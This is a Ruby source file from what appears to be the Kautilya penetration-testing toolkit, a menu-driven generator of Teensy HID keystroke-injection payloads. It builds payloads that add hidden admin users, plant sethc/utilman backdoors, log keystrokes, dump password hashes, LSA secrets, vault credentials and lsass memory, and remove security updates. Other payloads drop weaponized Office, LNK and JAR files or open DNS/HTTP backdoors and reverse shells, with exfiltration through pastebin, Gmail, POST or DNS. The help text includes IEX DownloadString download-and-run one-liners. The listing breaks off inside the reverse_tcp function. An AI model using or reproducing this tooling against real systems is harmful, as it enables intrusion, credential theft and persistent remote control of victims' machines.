require "rubygems"
require 'bundler/setup'
require "colored"
require "highline/import"

def search_replace(filein,fileout,*param)
  file = File.read(filein)
  if (param[0] != "noexfil")
    exfilmethodscalls = File.read("./lib/src/exfilmethodscalls")
    input = file.gsub(/EXFILCALLS/,exfilmethodscalls)
    exfilmethodsdefs = File.read("./lib/src/exfilmethodsdefs")
    input = input.gsub(/EXFILDEFS/,exfilmethodsdefs)
  else
    input = file.gsub(/EXFILCALLS/,"")
    input = input.gsub(/EXFILDEFS/,"")
  end
  input = input.gsub(/INPUT0/,param[0])
  i = 1
  while i <= param.length do
    if param[i]
      input = input.gsub(/\bINPUT#{i}\b/,param[i])
    end
    i+=1
  end

 if (param[param.length - 1] == "persist")
  persistmethodscalls = File.read("./lib/src/persistmethodscalls")
  input = input.gsub(/PERSCALLS/,persistmethodscalls)
  persistmethodsdefs = File.read("./lib/src/persistmethodsdefs")
  input = input.gsub(/PERSDEFS/,persistmethodsdefs)
 else
  input = input.gsub(/PERSCALLS/,"")
  input = input.gsub(/PERSDEFS/,"")
 end
 board = boardtype()
 teensydefsfile = File.read("./lib/src/methodsdefs")
 input = input.gsub(/DEFS/,teensydefsfile)
 input = input.gsub(/BOARDTYPE/,board)
 file = File.new(fileout,"w")
 File.open(fileout,"w") {|f| f.puts input}
 file.close
 puts"\nNow copy the generated #{fileout} to your HID.".cyan.bold
 puts"\nPress return to return to Main Menu.".yellow.bold
 gets
end

def input(userinput)
  print"\n"
  print "Kautilya>".green.underline
  print " #{userinput}"
  value = gets.chomp()
  return value
end

def boardtype()
  board = input("Select the board type you want to use: Teesny++ 2.0 (Press 2), Teensy 3 (Press 3): ")
  if (board == "2")
    "TEENSY2"
  elsif (board == "3")
    "TEENSY3"
  end
end

def outoption()
  outopt = input("Select the method to exfiltrate data: No exfiltration (Press 0), Pastebin (Press 1), Gmail (Press 2), HTTP POST to your own website (Press 3), DNS TXT Queries (Press 4): ")
  if (outopt == "0")
    "noexfil"
  elsif (outopt == "1")
    return "pastebin", getusername(), getpassword(), getdevkey()
  elsif (outopt == "2")
    return "gmail", getusername(), getpassword()
  elsif (outopt == "3")
    return "post", geturl()
  elsif (outopt == "4")
    return "dns", getdomain(),getauthns()
  end
end

def persistence()
  persistoption = input("Do you want the payload to be reboot persistent? Enter y/n: ")
  if (persistoption == "y")
    "persist"
  else
    "nopersistence"
  end
end

def input_pass(userinput)
   print"\n"
  print "Kautilya>".green.underline

  #value = gets.chomp()
  value = ask("#{userinput} ") {|q| q.echo = "*"}
  return value
end

def getusername
  username = input("Enter username for the pastebin/gmail account where data should be uploaded (do not trail username with @gmail.com): ")
  return username
end

def getpassword
  password = input_pass(" Enter password for the pastebin/gmail account where info should be uploaded: ")
  return password
end

def getdevkey
  devkey = input("Enter api dev key (required only for pastebin, available after registration to pastebin): ")
  return devkey
end

def geturl
  url = input("Enter the url of your website which accepts HTTP POST requests and saves at least one POST parameter: ")
  return url
end

def getdomain()
  domain = input("Enter the domain where you can log TXT queries: ")
  return domain
end

def getauthns()
    authns = input("Enter the Authorized NameServer of the domain or use Google (8.8.8.8) or Open DNS (208.67.222.222): ")
    return authns
end

def windows_add_user()
  puts"\nThis payload adds a user with Administrative privs on the target machine.".bold
  username = input("Enter Username for the user to be added: ")
  password = input_pass("Enter Password for the user to be added: ")
  search_replace("./lib/src/user_add.pde","#$output_path/output/user_add.pde",username,password)
end

def default_dns()
  puts"\nThis payload changes the Primary DNS server on the target machine.".bold
  ip = input("Enter the IP to be set as Primary DNS: ")
  search_replace("./lib/src/default_dns.pde","#$output_path/output/default_dns.pde",ip)
end

def edit_hosts()
  puts"\nThis payload can be used to make entries to the hosts file on the target machine".bold
  domain = input("Enter the domain name to be resolved: ")
  ip = input("Enter the IP the domain name is to be resolved: ")
  search_replace("./lib/src/edit_hosts.pde","#$output_path/output/edit_hosts.pde",ip,domain)
end

def enable_rdp()
  puts"\nThis payload adds an Administrative User, Starts RDP Service and adds exception to Windows firewall.".bold
  username = input("Enter Username for the user to be added: ")
  password = input_pass("Enter password for the user to be added: ")
  search_replace("./lib/src/enable_rdp.pde","#$output_path/output/enable_rdp.pde",username,password)
end

def enable_telnet()
  puts"\nThis payload adds an Administrative User, installs and starts telnet server and adds exception to Windows firewall.".bold
  username = input("Enter Username for the user to be added: ")
  password = input_pass("Enter password for the user to be added: ")
  search_replace("./lib/src/enable_telnet.pde","#$output_path/output/enable_telnet.pde",username,password)
end

def force_browse()
  puts"\nThis payload browses silently a given URL using Internet Explorer".bold
  url = input("Enter the URL to open: ")
  search_replace("./lib/src/force_browse.pde","#$output_path/output/force_browse.pde",url)
end

def download_execute()
  puts"\nThis payload downloads an exe in text format from a url, changes it back to exe and executes it.".bold
  puts"You must manually convert and upload an exe to text.".bold
  puts"You should use the powershell script (../extras/exetottxt.ps1) for conversion.".bold
  url = input("Enter the URL where your exe is pasted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
  search_replace("./lib/src/download_exec.pde","#$output_path/output/download_exec.pde",url)
end

def backdoor()
  puts"\nThis payload sets the given executable as debugger for sethc.exe and utilman,exe. After this payload gets executed,".bold
  puts"Pressing Shift 5 times or pressing 'Windows Key + U' on a locked system will run the defined executable with SYSTEM privileges.".bold
  sethc = input("Enter the path of executable to replace sethc (Use triple backslash like C:\\\\\\windows\\\\\\system32\\\\\\cmd.exe): ")
  utilman = input("Enter the path of executable to replace Utilman (Use triple backslash like C:\\\\\\windows\\\\\\system32\\\\\\cmd.exe): ")
  search_replace("./lib/src/backdoor.pde","#$output_path/output/backdoor.pde",sethc,utilman)
end

def uninstall()
  puts"\nThis payload unsinstalls the given application.".bold
  puts"Application name should be same as it appears in Registry and it should be msiexec compatible.".bold
  app = input("Enter the name of the app to uninstall: ")
  search_replace("./lib/src/uninstall.pde","#$output_path/output/uninstall.pde",app)
end


def info()
  puts"\nThis payload dumps lots of useful information from target system and exfiltrates that using an exfiltration method of choice.".bold
  puts"Information like registry keys, output of net command, contents of hosts file etc.".bold
  outopt,username,password,devkey = outoption()
  search_replace("./lib/src/info.pde","#$output_path/output/info.pde",outopt,username,password,devkey)
end

def hashdump_powershelldown()
  puts"\nThis payload uses powershell script to dump password hashes from the target.".bold
  puts"You have to manually upload the script to a website. The script is downloaded and executed.".bold
  puts"After the script is executed the hashes are exfiltrated using method of choice.".bold
  puts"You can find the script at ../extras/hashdump_download.ps1 \n".bold
  url  = input("Enter the URL where you have pasted hashdump_download script (for pastebin use raw format like http://pastebin.com/raw.php?i=YeMYP68J): " )
  outopt,username,password,devkey = outoption()
  search_replace("./lib/src/hashdump_powershelldown.pde","#$output_path/output/hashdump_powershelldown.pde",outopt,username,password,devkey,url)
end

def keylogger()
  puts"\nThis payload logs the keys and uploads to exfiltration method of choice,  after a given interval.".bold
  puts"A separate powershell script found in ../extras/parsekeys.ps1 must be used to change logs to meaningful words.".bold
  time = input("Enter the time interval in seconds for keys to be uploaded (recommended - 60+ seconds: ")
  checkurl = input("The URL, which will be checked at a regular interval, when set to a particular string will stop the payload: ")
  stopstring = input("The string, if responded in the checkurl, will stop the payload: ")
  outopt,username,password,devkey = outoption()
  persist = input("Do you want the payload to be reboot persistent? Enter y/n: ")
  search_replace("./lib/src/keylogger.pde","#$output_path/output/keylogger.pde",outopt,username,password,devkey,time,checkurl,stopstring,persist)
end

def sniffer()
  puts"\nThis payload sniffs traffic from the target system and uploads it to given FTP server after a given time interval.".bold
  puts"The script to sniff the traffic must be manually uploaded to a website.".bold
  puts"You can find the script at ../extras/sniffer.ps1 \n".bold
  url  = input("Enter the url where you have pasted sniffer script (use raw format for pastebon, like http://pastebin.com/raw.php?i=mvsB7Evp): " )
  time = input("Enter the time interval in seconds for packets to be uploaded to ftp: ")
  username = input("Enter username for the ftp server: ")
  password = input_pass("Enter password for the ftp server: ")
  server = input("Enter IP address of the ftp server: ")
  search_replace("./lib/src/sniffer.pde","#$output_path/output/sniffer.pde",url,time,username,password,server)
end

def rogue_ap()
  puts"\nThis payload creates a wireless hosted network on Windows 7 and executes a meterpreter bind using powershell.".bold
  puts"\nThis payload executes shellcode using powerhsell and is based upon Matt's post on exploit-monday blog.".bold
  puts"Currently, to use this you need to copy msf shellcode to rogue_ap.txt in src directory."
  puts"The shellcode needs to be generated using the command in payloadgen.txt in extras directory."
  puts"To connect to the bind shell. Set LPORT in msfvenom to what you specify here."
  puts"In msfvenom RHOST must be set to the IP of Default Gateway, AFTER connecting to the SSID."
  file = File.read("./lib/src/rogue_ap.pde")
  file_p = File.read("./lib/src/rogue_ap.txt")
  shellcode = file_p.scan(/.{1,150}/)
  key_init = "Keyboard.println(\"echo "
  key_end = " >> %temp%\\\\\\ra.ps1\");\n"
  input = ""
  File.foreach("./lib/src/rogue_ap.pde") do |line|
    if (line =~ /SHELLCODE/)
      shellcode.each do |codeline|
        input = input + key_init
        input = input + codeline
        input = input + key_end
      end
    end
  end
  input = file.gsub(/SHELLCODE/,input)
  File.open("./lib/src/rogue_ap.tmp","w") {|f| f.puts input}
  ssid = input("Enter the SSID for the hosted network to be added: ")
  key = input_pass("Enter the key (min 8 chracters) for the network: ")
  port = input("Enter the port on which bind shell will listen: ")
  search_replace("./lib/src/rogue_ap.tmp","#$output_path/output/rogue_ap.pde",ssid,key,port)
end

def signed_applet()
  puts"\nThis payload silently browses to a url where java_signed_applet exploit from msf is listening and accepts the Warning.".bold
  puts"You have to manually setup a listener for java_signed_applet exploit."
  url  = input("Enter the URL where Java Signed Applet server is running: ")
  search_replace("./lib/src/signed_applet.pde","#$output_path/output/signed_applet.pde",url)
end

def force_wifi()
  puts"\nThis payload forcefully connects to an attacker controlled WiFi AP (ideally hosted on a smartphone).".bold
  puts"After connecting to the AP, this payload pulls a meterpreter exe in text format, converts and executes it on the target."
  puts"You need a WiFi AP in the vicinity of target and a web server to host meterpreter shellcode."
  puts"The key for WiFi network will be stored in clear text on target, this is required for adding the profile properly on target."
  puts"Tested using portable WiFi hostspot on Android Phone and kWS web server."
  #profilename = input("Enter Profile name which will be added to the target machine: ")
  ssid = input("Enter the SSID of hotspot controlled by you: ")
  hex_ssid = "#{ssid}".unpack('H*').join
  key = input_pass(" Enter the key for the SSID: ")
  url  = input("Enter the URL where msf payload is saved in text format: ")
  search_replace("./lib/src/force_wificonnect.ino","#$output_path/output/force_wificonnect.ino", ssid, hex_ssid, key, url)
end

def powershell_codeexec()
  
  puts"\nThis payload executes shellcode using powerhsell and is based upon Matt's post on exploit-monday blog.".bold
  puts"Currently, to use this payload you need to copy payload to powershell_codeexec.txt in src directory."
  puts"The payload needs to be generated using the command in payloadgen.txt in extras directory."
  file = File.read("./lib/src/powershell_codeexec.pde")
  file_p = File.read("./lib/src/powershell_codeexec.txt")
  shellcode = file_p.scan(/.{1,150}/)
  key_init = "Keyboard.println(\"echo "
  key_end = " >> %temp%\\\\\\ce.ps1\");\n"
  input = ""
  File.foreach("./lib/src/powershell_codeexec.pde") do |line|
    if (line =~ /SHELLCODE/)
      shellcode.each do |codeline|
        input = input + key_init
        input = input + codeline
        input = input + key_end
      end
    end
  end
  input = file.gsub(/SHELLCODE/,input)
  File.open("./lib/src/powershell_codeexec.tmp","w") {|f| f.puts input}
  search_replace("./lib/src/powershell_codeexec.tmp","#$output_path/output/powershell_codeexec.pde","")
end

def time_based_exec()
  puts"\nThis payload (by default) downloads and executes a powershell script based payload from a website at given time.".bold
  puts"The best way to use this is using such powershell script as download which can be used for further attacks."
  puts"It could be stopped remotely if the content of the URL provided in options matches the string."
  time = input("Enter the time when you want the payload to be downloaded in 24 hour format (e.g 16:45): ")
  payloadurl = input("Enter the url from where the powershell script would be downloaded (use \"raw\" url in case of pastebin): ")
  stopstring = input("Enter the string which will work as stopstring: ")
  outopt,username,password,devkey = outoption()
  search_replace("./lib/src/time_based_exec.ino","#$output_path/output/time_based_exec.ino",outopt,username,password,devkey,time,payloadurl,stopstring)
end

def wlan_keys()
  puts"\nThis payload dumps wlan keys in plain text from target system and exfiltrates the keys using method of choice.".bold
  outopt,username,password,devkey = outoption()
  search_replace("./lib/src/wlan_key.ino","#$output_path/output/wlan_key.ino",outopt,username,password,devkey)
end

def credentials()
  puts"\nThis payload opens a credential prompt on the target and could not be closed till valid credentials are entered.".bold
  puts"\nThe credenitals could then be posted to pastebin, gmail or tinypaste.".bold
  puts"You must register an account with pastebin/tinypaste/gmail to post credentials.".bold
  outopt,username,password,devkey = outoption()
  search_replace("./lib/src/credentials.ino","#$output_path/output/credentials.ino",outopt,username,password,devkey)
end

def dns_txt_codeexec()
  puts"\nThis payload could download meterpreter shellcode from TXT records and execute it in memory.".bold
  puts"You have to copy the msf shellcode/meterpreter as a TXT record of a domain cotrolled by you. Separate subdomains for 32 bit and 64 bit shellcode."
  puts"\nUse the Out-DnsTxt PowerShell script in extras directory to generate TXT records from the shellcode."
  puts"The architecture of target is determined during execution on the target, the whole technique is based on work by Matt from Exploit Monday"
  puts"Only the subdomain which holds shellcode for target architecture is queried."
  puts"The metasploit shellcode needs to be generated using \"msfvenom -f powershell\" (see payloadgen.txt in extras directory)."
  puts"Use Authorized Name Server with caution. While it helps in changes to TXT records being immeidately available to the payload, it also increaes the chances of detection."
  domain32 = input("Enter the domain whose TXT record will serve 32 bit shellcode (e.g. 32.alteredsecurity.com) : ")
  domain64 = input("Enter the domain whose TXT record will serve 64 bit shellcode (e.g. 64.alteredsecurity.com) ")
  subdomains = input("The number of subdomains of psdomain to be used to fetch encoded powershell script (e.g. 3): ")
  authns = input("IP address of the Auhtorized Name Server of domains being used in above options: ")
  search_replace("./lib/src/dns_code_exec.ino","#$output_path/output/dns_code_exec.ino",domain32, domain64, subdomains, authns)

end


def ncsi()
  puts"\nThis payload could be used to track a user connectivity by msking changes to NCSI settings.".bold
  puts"\nYou can configure NCSI parameters so that whenever target systems checks for connectivity, you will know."
  puts"For more info http://technet.microsoft.com/en-us/library/cc766017%28v=ws.10%29.aspx"

  webhost = input("Enter the IP address of host which NCSI will probe over HTTP: ")
  webpath = input("Enter the filename which NCSI will check for content: ")
  webcontent = input("Enter the content of above file which NCSI will check: ")
  dnshost = input("Enter the domain name which NCSI will probe over DNS (you can enter space here): ")
  dnscontent  = input("Enter the IP address to which above domain name should resolve to (you can enter space here): ")
  search_replace("./lib/src/ncsi.ino","#$output_path/output/ncsi.ino", webhost,webpath,webcontent,dnshost,dnscontent)

end

def speak()
  puts"\nThis payload \"speaks\" the given sentence on the target.".bold
  sentence = input("Enter senetence to be \"spoken\": ")
  search_replace("./lib/src/speak.ino","#$output_path/output/speak.ino", sentence)

end

def http_backdoor()
  puts"\nThis payload waits for a magicstring (command) from a URL and then downloads and executes a powershell script.".bold
  puts"\nThe payload will keep checking a given URL for specific content. As soon as trhe content matches the given string,"
  puts"\na powershell script would be downloaded and executed from the second URL. It eill continue to look for scripts till the"
  puts"contents of the gove URL matches stopstring"
  checkurl = input("Enter the url which the payload will query for command (use \"raw\" url in case of pastebin): ")
  magicstring = input("Enter the string which will work as magicstring: ")
  payloadurl = input("Enter the url from where the powershell script would be downloaded (use \"raw\" url in case of pastebin): ")
  stopstring = input("Enter the string which will work as stopstring: ")
  outopt,username,password,devkey = outoption()
  persist = persistence()
  search_replace("./lib/src/http_backdoor.ino","#$output_path/output/http_backdoor.ino", outopt,username,password,devkey,checkurl,magicstring,payloadurl,stopstring,persist)

end

def dns_txt_backdoor
  puts"\nThis payload acts a backdoor and is capable of receiving PowerShell scripts and commands from DNS TXT queries.".bold
  puts"\nThis payload continuosly queries DNS TXT records of a given domain. It takes further action based on the response recieved."
  puts"For a response for option \"startstring\" it queries another subdomain for command to execute."
  puts"For a response for option \"startps\" it queries given subdomains for encoded powershell script and then pulls and executes the script."
  puts"Use the Out-DnsTxt PowerShell script in extras directory to generate TXT records from PowerShell commands/scripts, some useful scripts could be found here (https://github.com/samratashok/nishang)."
  puts"The TXT records generated by Out-DnsTxt must be saved in separate subdomains."
  puts"Use Authorized Name Server with caution. While it helps in changes to TXT records being immeidately available to the payload, it also increaes the chances of detection."

  startdomain = input("The domain (or subdomain) whose TXT records would be checked regularly for instructions (e.g. start.alteredsecurity.com: ")
  startcommand = input("The string, if responded by TXT record of above domain, will make the payload query another domain for commands (e.g. startcommand): ")
  commanddomain = input("The domain whose TXT records would be used as commands to PowerShell (e.g. command.alteredsecurity.com): ")
  startps = input("The string, if responded by TXT record of startdomain, will make the payload query another domain for encoded PowerShell Script.(e.g. startps): ")
  psdomain = input("The TXT records of subdomains of this domain would be used to fetch encoded PowerShell script (e.g. script.alteredsecurity.com: ")
  subdomains = input("The number of subdomains of psdomain to be used to fetch encoded powershell script (e.g. 3): ")
  stopstring = input("The string, if responded by TXT record of startdomain, will stop the payload: ")
  authns = input("IP address of the Auhtorized Name Server of domains being used in above options: ")
  outopt,username,password,devkey = outoption()
  persist = persistence()
  search_replace("./lib/src/dns_txt_backdoor.ino","#$output_path/output/dns_txt_backdoor.ino",outopt,username,password,devkey,startdomain,startcommand,commanddomain,startps,psdomain,subdomains,stopstring,authns,persist)
end

def download_execute_ps()
  puts"\nThis payload downloads a powershell script from a url and executes it in memory.".bold
  url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
  arg = input("Enter the arguments to pass to the script: ")
  search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/download_execute_ps.ino",url,arg)
end

def remove_update()
  puts"\nPayload which silently removes updates for a target machine".bold
  puts"\nIt could be used to remove all updates, all security updates or a particular update."
  option = input("Enter \"All\" to remove all updates, \"Security\" to remove all security updates or a KBID (e.g. KB958644): ")
  search_replace("./lib/src/remove_update.ino","#$output_path/output/remove_update.ino",option)
end

def lsa_secrets()
  puts"\nThis payload uses powershell script to dump lsa secrets from the target.".bold
  puts"You have to manually upload the script to a website. The script is downloaded and executed.".bold
  puts"After the script is executed the secrets are exfiltrated using method of choice.".bold
  puts"You can find the script at ../extras/lsa_secrets.ps1 \n".bold
  url  = input("Enter the URL where you have pasted lsa_secrets script (for pastebin use raw format like http://pastebin.com/raw.php?i=ukhX7RSV): " )
  outopt,username,password,devkey = outoption()
  search_replace("./lib/src/lsa_secrets.ino","#$output_path/output/lsa_secrets.ino",outopt,username,password,devkey,url)

end

def screenshot()
  puts"\nThis payload takes screenshots from the target system at a given interval and uploads it to a FTP server after a given time interval.".bold
  puts"It is based on Get-TimedScreenshot from Powersploit (https://github.com/mattifestation/PowerSploit/)".bold
  puts"The code was submitted by Christian Schneider (@busbauen) and has been modified for Kautilya. \n".bold
  screeninterval = input("Enter the time interval in seconds for screenshots to be taken: ")
  time = input("Enter the time interval in seconds for packets to be uploaded to ftp: ")
  username = input("Enter username for the ftp server: ")
  password = input_pass("Enter password for the ftp server: ")
  server = input("Enter IP address of the ftp server: ")
  directory = input("Name of the directory on the FTP Server where screenshots could be uploaded: ")
  search_replace("./lib/src/screenshot.ino","#$output_path/output/screenshot.ino",screeninterval,time,username,password,server,directory)
end

def invoke_shellcode
  puts"\nThis payload could be used tp execute shellcode in memory.".bold
  puts"The script uses Invoke-Shellcode.ps1 which could be found in the extras directory."
  puts"By default, it connects back to the given IP and port and uses metasploit windows/meterpreter/reverse_https shellcode."
  puts"See help of Invoke-Shellcode.ps1 in extras directory for additional arguments."
  puts"Invoke-Shellcode script is part of Powersploit (https://github.com/mattifestation/PowerSploit/)"
  url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
  ip = input("Enter the IP address of metasploit listener: ")
  port = input("Enter the port of the metasploit listener: ")
  arg = "(Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost #{ip} -Lport #{port} -Force)"
  search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/invoke_shellcode.ino",url,arg)
end

def dump_passwords()
  puts"\nThis payload could be used to execute Mimikatz in memory.".bold
  puts"The script uses Invoke-Mimikatz.ps1 which could be found in the extras directory."
  puts"By default, it dumps user passwords in plain, See help of Invoke-Mimikatz.ps1 in extras directory for additional arguments."
  puts"Invoke-Mimikatz is written by Joseph Bialek (https://github.com/clymb3r/PowerShell/) and is a part of powersploit.)"
  url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
  arg = input("Enter the arguments to pass to the script (hit Enter for default action i.e. dump passwords): ")
  if (arg == "")
    arg = "Invoke-Mimikatz"
  end
  outopt,username,password,devkey = outoption()
  search_replace("./lib/src/dump_passwords.ino","#$output_path/output/dump_passwords.ino",outopt,username,password,devkey,url,arg)
end

def vss()
  puts"\nThis payload uses the Volume Shadows Service to create a copy of the SAM file.".bold
  puts"\n The SAM file could be exfiltrated only using gmail."
  outopt,username,password,devkey = outoption()
  if (outopt == "gmail" or outopt == "noexfil")
    search_replace("./lib/src/vss.ino","#$output_path/output/vss.ino",outopt,username,password,devkey)
  elsif
    puts"\n Please use gmail as SAM file would be sent as an attachment.".bold
  end
end

def memdump()
  puts"\nThis payload generate a dull memory minidump of a process".bold
  puts"The memory dump could be used to find juicy information from the memory."
  puts"By default, dumps memory of the lsass process. It could be exfiltrated using gmail."
  puts"The code has been taken from Out-Minidump.ps1 from Powersploit (https://github.com/mattifestation/PowerSploit/)"
  outopt,username,password,devkey = outoption()
  arg = input("Enter process to be dumped (hit Enter for default i.e. lsass): ")
  if (arg == "")
    arg = "lsass"
  end
  if (outopt == "gmail" or outopt == "noexfil")
    search_replace("./lib/src/memdump.ino","#$output_path/output/memdump.ino",outopt,username,password,devkey,arg)
  elsif
    puts"\n Please use gmail as the dump file would be sent as an attachment.".bold
  end
end

def getvault
  puts"\nThis payload dumps credentials from Windows vault with web creds in plain.".bold
  puts"The script uses Get-VaultCredential which could be found in the extras directory."
  puts"The code has been taken from Get-VaultCredential.ps1 from Powersploit (https://github.com/mattifestation/PowerSploit/)"
  url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
  outopt,username,password,devkey = outoption()
  search_replace("./lib/src/getvault.ino","#$output_path/output/getvault.ino",outopt,username,password,devkey,url)
end

def enable_psremoting
  puts"\nThis payload adds an Administrative User, configures Powershell remoting and adds exception to Windows firewall.".bold
  username = input("Enter Username for the user to be added: ")
  password = input_pass("Enter password for the user to be added: ")
  search_replace("./lib/src/enable_psremoting.ino","#$output_path/output/enable_psremoting.ino",username,password)
end

def gupt
  puts"\nThis backdoor could execute commands and scripts from specially crafted Wireless Network Names..".bold
  puts"\nGupt looks for a specially crafted Wireless Network Name/SSID from list of all avaliable networks."
  puts"\nIt matches first four characters of each SSID with the parameter MagicString."
  puts"\nOn a match, if the 5th character is a 'c', rest of the SSID name is considered to be a command and executed."
  puts"\nIf the 5th character is a 'u', rest of the SSID is considered the id part of Google URL Shortener and a script is downloaded and executed in memory."
  puts"\nGupt does not connect to any Wireless network and this makes it more stealthy and helps in bypassing network traffic monitoring."
  puts"\nSee this post for more details on using Gupt: http://www.labofapenetrationtester.com/2014/08/Introducing-Gupt.html"

  magicstring = input("Enter the magictring (strictly 4 characters) which Gupt compares with the availabble SSIDs: ")
  arguments = input("Enter the arguments/function name, if any, to be passed to the downloaded script: ")
  if (arguments == "")
    arguments = "null"
  end
  search_replace("./lib/src/gupt.ino","#$output_path/output/gupt.ino",magicstring, arguments)
end

def drop_word
  puts"\nThis payload drops an infected/weaponized MS Word file on a target.".bold
  puts"\nIt is able to execute a PowerShell command or one-liner on the target."
  puts"\nTo execute scripts use this: IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/evil.ps1'));EvilFunction"
  puts"\nTo use scripts from Nishang (https://github.com/samratashok/nishang) use above."
  puts"\nFor example, IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/Get-Information.ps1'));Get-Information"
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2015/01/dropping-weaponized-files-using-hid.html"

  cmd = input("Enter the payload (PowerShell command or one-liner) to be executed: ")
  filename = input("Enter the name of the Word file to be dropped on target (Hit enter for default): ")
  if (filename == "")
    filename = "$env:Userprofile\\\\\\Desktop\\\\\\Salary_Details.doc"
  end
  search_replace("./lib/src/drop_word.ino","#$output_path/output/drop_word.ino",cmd, filename)
end

def drop_excel
  puts"\nThis payload drops an infected/weaponized MS Excel file on a target.".bold
  puts"\nIt is able to execute a PowerShell command or one-liner on the target."
  puts"\nTo execute scripts use this: IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/evil.ps1'));EvilFunction"
  puts"\nTo use scripts from Nishang (https://github.com/samratashok/nishang) use above."
  puts"\nFor example, IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/Get-Information.ps1'));Get-Information"
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2015/01/dropping-weaponized-files-using-hid.html"

  cmd = input("Enter the payload (PowerShell command or one-liner) to be executed: ")
  filename = input("Enter the name of the Excel file to be dropped on target (Hit enter for default): ")
  if (filename == "")
    filename = "$env:Userprofile\\\\\\Desktop\\\\\\Salary_Details.xls"
  end
  search_replace("./lib/src/drop_excel.ino","#$output_path/output/drop_excel.ino",cmd, filename)
end

def drop_chm
  puts"\nWARNING: This payload takes much longer time on a target as compared to other payloads in Kautilya.".bold
  puts"\nThis payload drops an infected/weaponized CHM (Compiled HTML Help) file on a target.".bold
  puts"\nIt is able to execute a PowerShell command or one-liner on the target."
  puts"\nUse Out-CHM PowerShell script from the extras directory to generate byte encoded CHM encodedchm.txt."
  puts"\nCopy encodedchm.txt to lib/src directory of Kautilya."
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2015/01/dropping-weaponized-files-using-hid.html"
  
  #Read encodedchm.txt created using the Out-CHM script in the extras directory.
  file = File.read("./lib/src/drop_chm.ino")
  file_r = File.read("./lib/src/encodedchm.txt")
  file_p = file_r.split("\n")
  
  key_init = "Keyboard.println(\"echo "
  key_end = " >> %temp%\\\\\\dchm.ps1\");\n"
  input = ""
  File.foreach("./lib/src/drop_chm.ino") do |line|
    if (line =~ /ENCODEDFILE/)
      file_p.each_slice(100) {|i|
        codeline = i.to_s.gsub('"','').gsub('[','').gsub(']','').gsub(' ','').gsub("\n",',')
        input = input + key_init
        input = input + codeline.to_s
        input = input + key_end
      }
    end
  end
  input = file.gsub(/ENCODEDFILE/,input)
  File.open("./lib/src/drop_chm.tmp","w") {|f| f.puts input}
  search_replace("./lib/src/drop_chm.tmp","#$output_path/output/drop_chm.ino","null")
end

def drop_shortcut
  puts"\nThis payload drops an infected/weaponized Shortcut file (.lnk) on a target.".bold
  puts"\nIt is able to execute a PowerShell command or one-liner on the target."
  puts"\nTo execute scripts use this: IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/evil.ps1'));EvilFunction."
  puts"\nTo use scripts from Nishang(https://github.com/samratashok/nishang)use above."
  puts"\nFor example, IEX ((New-Object Net.WebClient).DownloadString('http://yourwebserver/Get-Information.ps1'));Get-Information"
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2015/01/dropping-weaponized-files-using-hid.html"

  cmd = input("Enter the payload (PowerShell command or one-liner) to be executed: ")
  hotkey = input("Enter the Hotkey to be assigned to the Shortcut on target, the payload executes each time the key is pressed by a user e.g. \"F5\" (Hit enter for default F5): ")
  icon = input("Enter the Icon to be assigned to the Shortcut on target e.g. \"notepad.exe\" (Hit enter for default \"explorer.exe\"): ")
  filename = input("Enter the name of the Shortcut file to be dropped on target (Hit enter for default): ")
  if (hotkey == "")
    hotkey = "F5"
  end
  if (icon == "")
    icon = "explorer.exe"
  end
  if (filename == "")
    filename = "$env:Userprofile\\\\\\Desktop\\\\\\Shortcut to File Server.lnk"
  end
  search_replace("./lib/src/drop_shortcut.ino","#$output_path/output/drop_shortcut.ino",cmd, hotkey, icon, filename)
end

def drop_jar
  puts"\nWARNING: This payload takes much longer time on a target as compared to other payloads in Kautilya.".bold
  puts"\nThis payload drops an infected/weaponized JAR file on a target.".bold
  puts"\nIt is able to execute a PowerShell command or one-liner on the target."
  puts"\nUse Out-Java PowerShell script from the extras directory to generate byte encoded JAR encodedjar.txt."
  puts"\nCopy encodedjar.txt to lib/src directory of Kautilya."
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2015/01/dropping-weaponized-files-using-hid.html"

  #Read encodedjar.txt created using the Out-CHM script in the extras directory.
  file = File.read("./lib/src/drop_jar.ino")
  file_r = File.read("./lib/src/encodedjar.txt")
  file_p = file_r.split("\n")

  key_init = "Keyboard.println(\"echo "
  key_end = " >> %temp%\\\\\\djar.ps1\");\n"
  input = ""
  File.foreach("./lib/src/drop_jar.ino") do |line|
    if (line =~ /ENCODEDFILE/)
      file_p.each_slice(100) {|i|
        codeline = i.to_s.gsub('"','').gsub('[','').gsub(']','').gsub(' ','').gsub("\n",',')
        input = input + key_init
        input = input + codeline.to_s
        input = input + key_end
      }
    end
  end
  input = file.gsub(/ENCODEDFILE/,input)
  File.open("./lib/src/drop_jar.tmp","w") {|f| f.puts input}

  
  filename = input("Enter the name of the JAR file to be dropped on target (Hit enter for default): ")
  if (filename == "")
    filename = "$env:Userprofile\\\\\\Desktop\\\\\\JavaUpdate.jar"
  end
  search_replace("./lib/src/drop_jar.tmp","#$output_path/output/drop_jar.ino",filename)
end

def reverse_tcp
  puts"\nThis payload connects back to the attacker's machine on the given IP address and TCP port.".bold
  puts"\nA listener must be started on the attacker's machine on the given TCP port.".bold
  puts"\nThe payload is derived from Powerfun written by Ben Turner & Dave Hardy "
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
  ipaddr = input("Enter the IP address to which the target will connect back: ")
